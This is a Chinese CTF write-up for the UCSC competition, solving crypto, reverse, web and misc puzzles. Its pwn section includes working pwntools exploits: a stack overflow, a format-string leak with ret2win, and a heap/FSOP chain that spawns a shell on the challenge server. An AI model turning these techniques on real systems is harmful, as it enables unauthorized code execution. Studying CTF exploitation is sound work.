---
title: ucsc 不知道 WP
date: 2025-04-21 21:00:49
tags: [cry,web,re,pwn,misc]
categories: wp
typora-root-url: ./..
---

# 战队名：不知道

**排名**：**1**

![7918DA86D3B117713C82E1F48AA03B79](/images/7918DA86D3B117713C82E1F48AA03B79-1745240699577-65.png)

# Crypto

### **XR4-ucsc**

已知密钥，修改random_num逻辑异或回去即可

```python
import base64
import random
# from secret import flag
import numpy as np
def init_sbox(key):
    s_box = list(range(256))
    j = 0
    for i in range(256):
        j = (j + s_box[i] + ord(key[i % len(key)])) % 256
        s_box[i], s_box[j] = s_box[j], s_box[i]
    return s_box
def decrypt(cipher, box):
    res = []
    i = j = 0
    cipher_bytes = base64.b64decode(cipher)
    for s in cipher_bytes:
        i = (i + 1) % 256
        j = (j + box[i]) % 256
        box[i], box[j] = box[j], box[i]
        t = (box[i] + box[j]) % 256
        k = box[t]
        res.append(chr(s ^ k))
    return (''.join(res))
def random_num(seed_num):
    random.seed(seed_num)
    for i in range(6):
        for j in range(6):
            print(chr(int(str(random.random()*10000)[0:2]) ^ (transposed_matrix[j][i])),end='')

if __name__ == '__main__':
    transposed_matrix=[
[  1 ,111 , 38, 110 , 95 , 44],
[ 11,  45  ,58,  39  ,84,   1],
[116 , 19 ,113 , 60  ,91 ,118],
[ 33  ,98  ,38  ,57  ,10 , 29],
[ 68  ,52 ,119  ,56 , 43 ,125],
[ 32  ,32,   7  ,26,  41 , 41]]
        
    ciphertext = "MjM184anvdA="
    key = "XR4"
    box = init_sbox(key)
    a=decrypt(ciphertext, box)
    print(a)
    random_num(int(a))
```

### **essential-ucsc**

```c++
from Crypto.Util.number import *
import sympy
from flag import flag

a=getPrime(512)
p=sympy.nextprime(13*a)
q=sympy.prevprime(25*a)
number2=p*q

def crypto01(number1, number2, number3):
    number4 = 1
    while number2 > 0:
        if number2 % 2: 
            number4 = (number4 * number1) % number3
        number1 = number1 ** 2 % number3
        number2 //= 2
    return number4

def crypto02(number1, number2):
    number3 = number1
    number4 = number2
    giao = 1
    giaogiao = 0
    while number4 > 0:
        number7 = number3 // number4
        giao, giaogiao = giaogiao, giao - giaogiao*number7
        number3, number4 = number4, number3 - number4*number7
    while giao<0:
        giao = giao + number2
    return giao

def crypto03(number1, number2, number3):
    number4 = crypto01(number3, number1, number2)
    return number4

def crypto05(number1,number2):
    return pow(number1,0xe18e,number2)

number3 = int.from_bytes(flag[0:19].encode("utf-8"), "big")
number4 = int.from_bytes(flag[19:39].encode("utf-8"), "big")

print(crypto03(number1, number2, number3))
print(crypto05(number4,number2))
```

简单看出给出的值为 n3^n1 %n2 和 n4 ^ 0xe18e % n2 

前一个因为p，q的值与a相关，除以因子后开方得到近似值，第二部分因为flag长度较小，直接开方得到flag

```python
from Crypto.Util.number import *
number1 = 6035830951309638186877554194461701691293718312181839424149825035972373443231514869488117139554688905904333169357086297500189578624512573983935412622898726797379658795547168254487169419193859102095920229216279737921183786260128443133977458414094572688077140538467216150378641116223616640713960883880973572260683
number2 = 20163906788220322201451577848491140709934459544530540491496316478863216041602438391240885798072944983762763612154204258364582429930908603435291338810293235475910630277814171079127000082991765275778402968190793371421104016122994314171387648385459262396767639666659583363742368765758097301899441819527512879933947

# n3^n1 %n2
c1=6624758244437183700228793390575387439910775985543869953485120951825790403986028668723069396276896827302706342862776605008038149721097476152863529945095435498809442643082504012461883786296234960634593997098236558840899107452647003306820097771301898479134315680273315445282673421302058215601162967617943836306076
# n4 ^ 0xe18e % n2
c2=204384474875628990804496315735508023717499220909413449050868658084284187670628949761107184746708810539920536825856744947995442111688188562682921193868294477052992835394998910706435735040133361347697720913541458302074252626700854595868437809272878960638744881154520946183933043843588964174947340240510756356766
from gmpy2 import *

a=gmpy2.iroot(number2//(13*25),2)[0]
p=sympy.nextprime(13*a)
print(p)
print(number2%p)
q=number2//p

phi=(p-1)*(q-1)
d1=inverse(number1,phi)
print(GCD(0xe18e,phi))

d2=inverse(0xe18e//2,phi)
m2=pow(c2,d2,number2)

f2=int(gmpy2.iroot(m2,2)[0])

f1=pow(c1,d1,number2)
flag=long_to_bytes(f1)+long_to_bytes(f2)
print(flag)
```

### **MERGE_ECC--ucsc**

```python
import random
from sympy import nextprime
def part1():
    p = random_prime(2^512, 2^513)
    a = random.randint(0, p-1)
    b = random.randint(0, p-1)
    while (4 * a**3 + 27 * b**2) % p == 0:
        a = random.randint(0, p-1)
        b = random.randint(0, p-1)

    E = EllipticCurve(GF(p), [a, b])

    P=E.random_point()

    n = [random.randint(1, 2**20) for _ in range(3)] 
    assert part1=''.join([hex(i)[2:] for i in n])
    cipher = [n[i] * P for i in range(3)]

    print(f"N = {p}")
    print(f"a = {a}, b = {b}")
    print(f"P = {P}")

    for i in range(3):
        print(f"cipher{i} = {cipher[i]}")

def part2():
    p =  839252355769732556552066312852886325703283133710701931092148932185749211043
    a =  166868889451291853349533652847942310373752202024350091562181659031084638450
    b =  168504858955716283284333002385667234985259576554000582655928538041193311381
    P = E.random_point()
    Q = key*P
    print("p = ",p)
    print("a = ",a)
    print("b = ",b)
    print("P = ",P)
    print("Q = ",Q)
    assert part2=key

part1()
print("-------------------------------------------")
part2()
assert flag="flag{"+str(part1)+"-"+str(part2)+"}"
```

part1：发现n = [random.randint(1, 2**20) for _ in range(3)] ，在可以爆破的范围，直接爆破出n即可

part2：数字较小直接求离散对数即可

```python
N = 8186762541745429544201163537921168767557829030115874801599552603320381728161132002130533050721684554609459754424458805702284922582219134865036743485620797
a = 1495420997701481377470828570661032998514190598989197201754979317255564287604311958150666812378959018880028977121896929545639701195491870774156958755735447
b = 5991466901412408757938889677965118882508317970919705053385317474407117921506012065861844241307270755999163280442524251782766457119443496954015171881396147
E1 = EllipticCurve(GF(N), [a, b])
P = E1(6053058761132539206566092359337778642106843252217768817197593657660613775577674830119685211727923302909194735842939382758409841779476679807381619373546323 , 7059796954840479182074296506322819844555365317950589431690683736872390418673951275875742138479119268529134101923865062199776716582160225918885119415223226 )

cipher0 = E1(4408587937721811766304285221308758024881057826193901720202053016482471785595442728924925855745045433966244594468163087104593409425316538804577603801023861 , 5036207336371623412617556622231677184152618465739959524167001889273208946091746905245078901669335908442289383798546066844566618503786766455892065155724816 )
cipher1 = E1(2656427748146837510897512086140712942840881743356863380855689945832188909581954790770797146584513962618190767634822273749569907212145053676352384889228875 , 4010263650619965046904980178893999473955022015118149348183137418914551275841596653682626506158128955577872592363930977349664669161585732323838763793957500 )
cipher2 = E1(1836350123050832793309451054411760401335561429787905037706697802971381859410503854213212757333551949694177845513529651742217132039482986693213175074097638 , 1647556471109115097539227566131273446643532340029032358996281388864842086424490493200350147689138143951529796293632149050896423880108194903604646084656434 )
cipher=[cipher0,cipher1,cipher2]
'''n=[]
from tqdm import tqdm
for k in tqdm(range(2**12,2**20)):
    if k*P in cipher:
            n.append(int(k))
    if len(n)==3:
        break

print(n)'''
n=[651602, 943532, 1008061]
part1=''.join([hex(i)[2:] for i in n])
print(part1)

p2 =  839252355769732556552066312852886325703283133710701931092148932185749211043
a2 =  166868889451291853349533652847942310373752202024350091562181659031084638450
b2 =  168504858955716283284333002385667234985259576554000582655928538041193311381
E2 = EllipticCurve(GF(p2), [a2, b2])
P2 =  E2(547842233959736088159936218561804098153493246314301816190854370687622130932 , 259351987899983557442340376413545600148150183183773375317113786808135411950)
Q =  E2(52509027983019069214323702207915994504051708473855890224511139305828303028 , 520507172059483331872189759719244369795616990414416040196069632909579234481)

key=P2.discrete_log(Q)
print(int(key))

key1=[1,1,1]
for i in range(len(n)):
    for j in  range(len(cipher)):
        if n[i]*P==cipher[j]:
            key1[j]=n[i]
print(key1)

part1=''.join([hex(i)[2:] for i in key1])

flag="flag{"+str(part1)+"-"+str(key)+"}"
print(flag)
```

### **Ez_Calculate-ucsc**

```python
from Crypto.Util.number import *
from random import randint
from hashlib import md5

flag1 = b'xxx'
flag2 = b'xxx'
Flags = 'flag{' + md5(flag1+flag2).hexdigest()[::-1] + '}'

def backpack_encrypt_flag(flag_bytes, M, group_len):
    bits = []
    for byte in flag_bytes:
        bits.extend([int(b) for b in format(byte, "08b")])

    while len(bits) % group_len != 0:
        bits.append(0)

    S_list = []
    for i in range(0, len(bits), group_len):
        group = bits[i:i + group_len]
        S = sum(bit * m for bit, m in zip(group, M))
        S_list.append(S)
    return S_list

def backpack(flag_bytes):
    R = [10]
    while len(R) < 8:
        next_val = randint(2 * R[-1], 3 * R[-1])
        R.append(next_val)
    B = randint(2 * R[-1] + 1, 3 * R[-1])
    A = getPrime(100)
    M = [A * ri % B for ri in R]
    S_list = backpack_encrypt_flag(flag_bytes, M, len(M))
    return R, A, B, M, S_list

p = getPrime(512)
q = getPrime(512)
n = p*q
e = 0x10000
m = bytes_to_long(flag1)
k = randint(1, 999)
problem1 = (pow(p,e,n)-pow(q,e,n)) % n
problem2 = pow(p-q,e,n)*pow(e,k,n)
c = pow(m,e,n)

R, A, B, M, S_list = backpack(flag2)

with open(r"C:\Users\Rebirth\Desktop\data.txt", "w") as f:
    f.write(f"problem1 = {problem1}\n")
    f.write(f"problem2 = {problem2}\n")
    f.write(f"n = {n}\n")
    f.write(f"c = {c}\n")
    f.write("-------------------------\n")
    f.write(f"R = {R}\n")
    f.write(f"A = {A}\n")
    f.write(f"B = {B}\n")
    f.write(f"M = {M}\n")
    f.write(f"S_list = {S_list}\n")
    f.write("-------------------------\n")
    f.write(f"What you need to submit is Flags!\n")
```

分两部分，第一部分e=2**16，使用Tonelli–Shanks以及中国剩余定理求解m

第二部分是普通的超递增背包，求解即可

```python
from Crypto.Util.number import *
from random import randint
from hashlib import md5

e=int(0x10000)
problem1 = 24819077530766367166035941051823834496451802693325219476153953490742162231345380863781267094224914358021972805811737102184859249919313532073566493054398702269142565372985584818560322911207851760003915310535736092154713396343146403645986926080307669092998175883480679019195392639696872929250699367519967334248
problem2 = 20047847761237831029338089120460407946040166929398007572321747488189673799484690384806832406317298893135216999267808940360773991216254295946086409441877930687132524014042802810607804699235064733393301861594858928571425025486900981252230771735969897010173299098677357738890813870488373321839371734457780977243838253195895485537023584305192701526016
n = 86262122894918669428795269753754618836562727502569381672630582848166228286806362453183099819771689423205156909662196526762880078792845161061353312693752568577607175166060900619163231849790003982326663277243409696279313372337685740601191870965951317590823292785776887874472943335746122798330609540525922467021
c = 74962027356320017542746842438347279031419999636985213695851878703229715143667648659071242394028952959096683055640906478244974899784491598741415530787571499313545501736858104610426804890565497123850685161829628373760791083545457573498600656412030353579510452843445377415943924958414311373173951242344875240776

R = [10, 29, 83, 227, 506, 1372, 3042, 6163]
A = 1253412688290469788410859162653
B = 16036
M = [10294, 12213, 10071, 4359, 1310, 4376, 7622, 14783]
S_list = [13523, 32682, 38977, 44663, 43353, 31372, 17899, 17899, 44663, 16589, 40304, 25521, 31372]

for k in range(999):
    e_pow_k = pow(e, k, n)
    term = (problem1 * e_pow_k) % n
    candidate = (problem2 + term) % n
    g = GCD(candidate, n)
    if g != 1:
        p=int(g)
        q=int(n//g)
        break
    
print(p,q)
print(n%p)
print(n%q)

def tonelli_shanks(a, p):
    Q = p - 1
    S = 0
    while Q % 2 == 0:
        Q //= 2
        S += 1
    z = Integer(2)
    while kronecker_symbol(z, p) != -1:
        z += 1
    M = S
    c_val = power_mod(z, Q, p)
    t = power_mod(a, Q, p)
    R = power_mod(a, (Q + 1) // 2, p)
  
    while t != 1:
        i = next(i for i in range(1, M) if power_mod(t, 2**i, p) == 1)
        b = power_mod(c_val, 2**(M - i - 1), p)
     
        R = (R * b) % p
        t = (t * b * b) % p
        c_val = (b * b) % p
        M = i
    return [Integer(R), Integer(p - R)]

def eth_root_prime(c_val, p, e_power):
    assert e_power & (e_power - 1) == 0, "e 必须为 2 的幂"
    k = e_power.bit_length() - 1
    roots = [Integer(c_val) % p]
    for _ in range(k):
        new_roots = []
        for r in roots:
            r_mod = Integer(r) % p
            if r_mod in (0, 1):
                new_roots.append(r_mod)
                if r_mod == 1:
                    new_roots.append(p - 1)
            else:
                if kronecker_symbol(r_mod, p) == 1:
                    sqs = tonelli_shanks(r_mod, p)
                    new_roots.extend(sqs)
        roots = list({Integer(x) for x in new_roots})
    return roots


def recover_plaintexts(c, p, q, e=2**16):
    roots_p = eth_root_prime(c % p, p, e)
    roots_q = eth_root_prime(c % q, q, e)
    candidates = []
    for rp in roots_p:
        for rq in roots_q:
            m = crt([rp, rq], [p, q])
            candidates.append(m)
    return candidates

m=recover_plaintexts(c, p, q)

A_inv = inverse(A, B)
S_primes = [(S * A_inv) % B for S in S_list]

bits = []
for s_prime in S_primes:
    group_bits = []
    remaining = s_prime
    for r in reversed(R):
        if remaining >= r:
            group_bits.append(1)
            remaining -= r
        else:
            group_bits.append(0)
    group_bits = group_bits[::-1]
    bits.extend(group_bits)

flag2 = bytearray()
for i in range(0, len(bits), 8):
    byte_bits = bits[i:i+8]
    byte = 0
    for bit in byte_bits:
        byte = (byte << 1) | bit
    flag2.append(byte)

flag2 = bytes(flag2).rstrip(b'\x00')
print("flag2 =", flag2)

for i in m:
    f1=long_to_bytes(i)
    print(f1)
    Flags = 'flag{' + md5(f1+flag2).hexdigest()[::-1] + '}'
    print(Flags)
```

# Web

### **ezLaravel-ucsc**

Dirsearch出

![img](/images/1745240699576-32.png)

访问flag.php得到flag

# Reverse

### simplere-ucsc

UPX壳，直接dbg+dump即可脱壳。

Base58换表加密

![img](/images/1745240699574-1.png)

![img](/images/1745240699574-2.png)

数据倒转异或加密

![img](/images/1745240699574-3.png)

```C++
#include <iostream>
#include <windows.h>
#include <string>
#include <vector>

unsigned __int64 decrypt(BYTE *encrypted, unsigned __int64 strlen_, BYTE *decrypted)
{
    unsigned __int64 i;

    for (i = 0; i < strlen_; i++)
    {
        decrypted[strlen_ - i - 1] = encrypted[i] ^ (i + 1);
    }
    return i;
}

int main()
{
    unsigned char Enc[] =
        {
            0x72, 0x7A, 0x32, 0x48, 0x34, 0x4E, 0x3F, 0x3A, 0x42, 0x33,
            0x47, 0x69, 0x75, 0x63, 0x7C, 0x7D, 0x77, 0x62, 0x65, 0x64,
            0x7B, 0x6F, 0x62, 0x50, 0x73, 0x2B, 0x68, 0x6C, 0x67, 0x47,
            0x69, 0x15, 0x42, 0x75, 0x65, 0x40, 0x76, 0x61, 0x56, 0x41,
            0x11, 0x44, 0x7F, 0x19, 0x65, 0x4C, 0x40, 0x48, 0x65, 0x60,
            0x01, 0x40, 0x50, 0x01, 0x61, 0x6F, 0x69, 0x57};

    unsigned char Dec[100]{};
    decrypt((BYTE *)Enc, 58, (BYTE *)Dec);

    printf("%.58s\n", Dec);
    return 0;
}
//mPWV7et2RTxobH5Tn8iqGSdFWc5vYzps1jHuynpvpfmsmxeL9K28H1L1xs
```

![img](/images/1745240699574-4.png)

### easy_re-ucsc

![img](/images/1745240699574-5.png)

![img](/images/1745240699574-6.png)

异或加密

```c++
#include <iostream>
#include <windows.h>
#include <string>
#include <vector>

int main()
{
    unsigned char a[] = "n=<;:h2<'?8:?'9hl9'h:l>'2>>2>hk=>;:?";
    for (int i = 0; i < 36; i++)
        a[i] ^= 10;
    printf("%.37s\n", a);
    // d7610b86-5205-3bf3-b0f4-84484ba74105
    return 0;
}
```

### EZ_debug-ucsc

断点此处单步运行得到flag

![img](/images/1745240699574-7.png)

![img](/images/1745240699575-8.png)

### re_ez-ucsc

单步跟到主要函数

这边循环输入字符，判断(Inputchar - 32)^3是否<4，这边可以得出一共就四个符合条件的字符

```C++
' ', '!', '\"', '#'
```

要经过一系列输入数据，并且数据变换最终要v0==3，然后输出以下内容。

![img](/images/1745240699575-9.png)

![img](/images/1745240699575-10.png)

输入的字符串md5就是flag。

那么直接爆破输入，让最后v0等于3即可得到目标系列字符串。

```c++
#include <iostream>
#include <vector>
#include <string>
#include <functional>

int main()
{
    unsigned long long k[5] = {
        0xFFFFFFFFFFFFFFFB, 0x0000000000000005, 0xFFFFFFFFFFFFFFFF, 0x0000000000000001,
        0x0000000000000000};

    char chars[4] = {'#', '"', '!', ' '};
    for (int len = 1; len <= 10; len++)
    {
        std::vector<std::vector<int>> combinations;
        std::vector<int> current(len);

        std::function<void(int)> generate = [&](int pos)
        {
            if (pos == len)
            {
                combinations.push_back(current);
                return;
            }

            for (int i = 0; i < 4; i++)
            {
                current[pos] = i;
                generate(pos + 1);
            }
        };

        generate(0);

        for (const auto &comb : combinations)
        {
            unsigned int map[25] = {
                0x00000001, 0x00000000, 0x00000001, 0x00000000, 0x00000001,
                0x00000001, 0x00000000, 0x00000001, 0x00000000, 0x00000001,
                0x00000001, 0x00000000, 0x00000001, 0x00000000, 0x00000001,
                0x00000001, 0x00000000, 0x00000000, 0x00000000, 0x00000001,
                0x00000001, 0x00000001, 0x00000001, 0x00000001, 0x00000001};

            unsigned long long v0 = 1;
            std::string a;
            bool valid = true;

            for (int i = 0; i < len; i++)
            {
                char c = chars[comb[i]];
                a.push_back(c);

                uint8_t v = c;
                uint8_t v13 = (v - 32) ^ 3;
                v0 += k[v13];

                if (v0 > 0x18 || map[v0])
                {
                    valid = false;
                    break;
                }

                map[v0] = 1;

                if (v0 == 3)
                {
                    std::cout << a << std::endl;
                    return 0;
                }
            }
        }
    }
    return 0;
}
// """  ###
```

![img](/images/1745240699575-11.png)

# Pwn

### **BoFido-ucsc**

开始输入有溢出，可以把随机种子改为任意值。把种子设为0这样就能通关了

exp

```python
from pwn import *

context(arch='amd64',os='linux')
context.log_level="INFO"
context.terminal = ["tmux", "splitw", "-h"]
#io=process("./chal")
#io=remote("dicec.tf", 32030)

r = lambda a : io.recv(a)
rl = lambda    a=False        : io.recvline(a)
ru = lambda a,b=True    : io.recvuntil(a,b)
s = lambda x            : io.send(x)
sl = lambda x            : io.sendline(x)
sa = lambda a,b            : io.sendafter(a,b)
sla = lambda a,b        : io.sendlineafter(a,b)
shell = lambda            : io.interactive()
def debug(script=""):
        gdb.attach(io, gdbscript=script)

def bunny(idx):
        sla(">", str(idx))
        #idx=idx

ans=""

val=[]
predict=process(["./predict", "100"])
for i in range(100):
        a=predict.recvline(False)
        #print hex(int(a[1]))
        val.append(int(a))

io=remote("39.107.58.236", 44590)
#io=process("./BoFido")

p="A"*20+p64(0)*2
sa(":", p)

for i in range(0, 30, 3):
        p=str(val[i])+" "+str(val[i+1])+" "+str(val[i+2])
        sl(p)

shell()
```

预判exp

```c++
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <time.h>
#include <unistd.h>

int main(int argc, char * argv[]){
        uint8_t dmg;

        for(int i=0;i<atoi(argv[1]);i++){
                //int item = rand() % 4;
                dmg = rand() % 255;
                printf("%d\n", dmg);
        }
}
```

### **userlogin-ucsc**

登陆普通用户有格式化字符串漏洞，泄漏root密码打ret2win

```python
from pwn import *

context(arch='amd64',os='linux')
context.log_level="INFO"
context.terminal = ["tmux", "splitw", "-h"]
#io=process("")
io=remote("39.107.58.236", 42744)

r = lambda a : io.recv(a)
rl = lambda    a=False        : io.recvline(a)
ru = lambda a,b=True    : io.recvuntil(a,b)
s = lambda x            : io.send(x)
sl = lambda x            : io.sendline(x)
sa = lambda a,b            : io.sendafter(a,b)
sla = lambda a,b        : io.sendlineafter(a,b)
shell = lambda            : io.interactive()
def debug(script=""):
        gdb.attach(io, gdbscript=script)

sla(":", "supersecureuser")
rl()
sl("%13$s")
root=rl()
print root

rop="A"*40+p64(0x0401276)+p64(0x0401261)

sla(":", root)
sla(":", rop)


shell()
```

### **疯狂复制-ucsc**

edit函数有整数溢出，添负数可以控制stdout和stdin结构题。先塞满0x90的tcache，再释放0x90大小的堆块来让他到unsorted bin，再创在一个堆块来拿到libc泄漏，最后更改stdout打io。

```python
from pwn import *

context(arch='amd64',os='linux')
context.log_level="INFO"
context.terminal = ["tmux", "splitw", "-h"]
#io=process("./chal")
libc=ELF("./libc.so.6")
io=remote("39.107.58.236", 45181)

r = lambda a : io.recv(a)
rl = lambda    a=False        : io.recvline(a)
ru = lambda a,b=True    : io.recvuntil(a,b)
s = lambda x            : io.send(x)
sl = lambda x            : io.sendline(x)
sa = lambda a,b            : io.sendafter(a,b)
sla = lambda a,b        : io.sendlineafter(a,b)
shell = lambda            : io.interactive()
def debug(script=""):
        gdb.attach(io, gdbscript=script)

def add(idx, size):
        sla(":", "1")
        sla(":", str(idx))
        sla("Size", str(size))

def edit(idx, content):
        sla(":", "2")
        sla(":", str(idx))
        sla(":", content)

def free(idx):
        sla(":", "4")
        sla(":", str(idx))

def view(idx):
        sla(":", "3")
        sla(":", str(idx))

for i in range(8):
        add(i, 0x80)
add(8, 0x10)

for i in range(8):
        free(i)

add(0, 0x30)
view(0)
ru(": ")
libc.address=u64(r(6).ljust(8, "\0"))-0x3ebd20
print hex(libc.address)

"""
fake_io=flat({
        0x0: " sh;",
        0x68: libc.symbols['system'],
        0x88: libc.sym["environ"]-0x10,
        0xa0: libc.symbols['_IO_2_1_stdout_'],
        0xd8: libc.sym["_IO_wfile_jumps"]-0x20,
        0xe0: libc.symbols['_IO_2_1_stdout_']
}, filler="\0")
"""

fake_io = flat({
    0x0: b'  sh;',
    0x8: libc.symbols['_IO_2_1_stdout_'] - 0x10,
    0x28: libc.symbols['system'],
    0x68: libc.symbols['system'],
    0x88: libc.symbols['_environ']-0x10,
    0xa0: libc.symbols['_IO_2_1_stdout_'] - 0x60,
    0xd0: libc.symbols['_IO_2_1_stdout_'],
    0xd8: libc.symbols['_IO_wfile_jumps'] - 0x20,
}, filler=b"\x00")


free(0)
free(8)
for i in range(32):
        add(i, 0x20)

#debug("break *_IO_wdoallocbuf\nc")
edit(-4, fake_io)
#debug()
shell()
```

# Misc

### **USB-ucsc**

CTF-NetA一把梭

![img](/images/1745240699575-12.png)

flag{ebdfea9b-3469-41c7-9070-d7833ecc6102}

### **小套不是套-ucsc**

对套.zip执行CRC32爆破。

代码：

```python
from binascii import crc32
import string
import zipfile
dic=string.printable
def CrackCrc(crc):
    for i in dic :
        # print (i)
        for j in dic:
            for p in dic:
                for q in dic:
                    s=i+j+p+q
                    # print (crc32(bytes(s,'ascii')) & 0xffffffff)
                    if crc == (crc32(bytes(s,'ascii')) & 0xffffffff):
                        print (s)
                        return
 
def getcrc32(fname):
    l=[]
    file = fname
    f = zipfile.ZipFile(file, 'r')
    global fileList
    fileList =f.namelist ()
    print (fileList)
    # print (type(fileList))
    for filename in fileList:
        Fileinfo = f.getinfo(filename)
        # print(Fileinfo)
        crc = Fileinfo.CRC
        # print ('crc',crc)
        l.append(crc)
    return l
 
def main (filename=None):
    l = getcrc32(filename)
    # print(l)
    for i in range(len(l)):
        print(fileList[i], end='的内容是:')
        CrackCrc(l[i])
 
if __name__  == "__main__":
    main ('test.zip')
```

![img](/images/1745240699575-13.png)

按照f后面数字的顺序拼接起来，随后cyberchef一把梭：

![img](/images/1745240699575-14.png)

另一个压缩包打开之后里面还有一个压缩包，伪加密解出来是一张图：

![img](/images/1745240699575-15.jpeg)

010，发现还有一张图。

![img](/images/1745240699575-16.png)

补一下png头。能搞出来另外一张图：

![img](/images/1745240699575-17.png)

IEDN后面就是oursecret加密的特征

![img](/images/1745240699575-18.png)

结合上面的密钥。oursecret解出flag。

![img](/images/1745240699575-19.png)

### **three-ucsc**

part1:8f02d3e7

![img](/images/1745240699575-20.png)

![img](/images/1745240699575-21.png)

part2:-ce89-4d6b-830e-

![img](/images/1745240699575-22.png)

part3:5d0cb5695077

压缩包密码thinkbell

![img](/images/1745240699575-23.png)

### No.shArk-ucsc

![img](/images/1745240699575-24.png)

流量中存在0101数据，转成二维码，修复完二维码扫描得到一个字符串"Y0U_Fi8d_ItHa@aaHH"。

![img](/images/1745240699575-25.png)

![img](/images/1745240699575-26.png)

流量中提取出三个文件和一个存在SNOW数据的html。

发现有SNOW隐写提示，使用SNOW解密出后半部分flag。

![img](/images/1745240699575-27.png)

![img](/images/1745240699575-28.png)

![img](/images/1745240699576-29.png)

结合提示，猜测另一个png图是要用Arnold Cat map变化来爆破出正确flag图。

百度找到的脚本直接可用（https://www.cnblogs.com/alexander17/p/18551089）。

```python
import matplotlib.pyplot as plt
import cv2
import numpy as np

def arnold_decode(image, shuffle_times, a, b):
    """ decode for rgb image that encoded by Arnold
    Args:
        image: rgb image encoded by Arnold
        shuffle_times: how many times to shuffle
    Returns:
        decode image
    """
    # 1:创建新图像
    decode_image = np.zeros(shape=image.shape)
    # 2：计算N
    h, w = image.shape[0], image.shape[1]
    N = h  # 或N=w

    # 3：遍历像素坐标变换
    for time in range(shuffle_times):
        for ori_x in range(h):
            for ori_y in range(w):
                # 按照公式坐标变换
                new_x = ((a * b + 1) * ori_x + (-b) * ori_y) % N
                new_y = ((-a) * ori_x + ori_y) % N
                decode_image[new_x, new_y, :] = image[ori_x, ori_y, :]
        image = np.copy(decode_image)
        
    return image

def arnold_brute(image,shuffle_times_range,a_range,b_range):
    for c in range(shuffle_times_range[0],shuffle_times_range[1]):
        for a in range(a_range[0],a_range[1]):
            for b in range(b_range[0],b_range[1]):
                print(f"[+] Trying shuffle_times={c} a={a} b={b}")
                decoded_img = arnold_decode(image,c,a,b)
                output_filename = f"flag_decodedc{c}_a{a}_b{b}.png"
                cv2.imwrite(output_filename, decoded_img, [int(cv2.IMWRITE_PNG_COMPRESSION), 0])
                
if __name__ == "__main__":
    img = cv2.imread("cat.png")
    arnold_brute(img, (1,8), (1,12), (1,12))
```

![img](/images/1745240699576-30.png)

![img](/images/1745240699576-31.png)
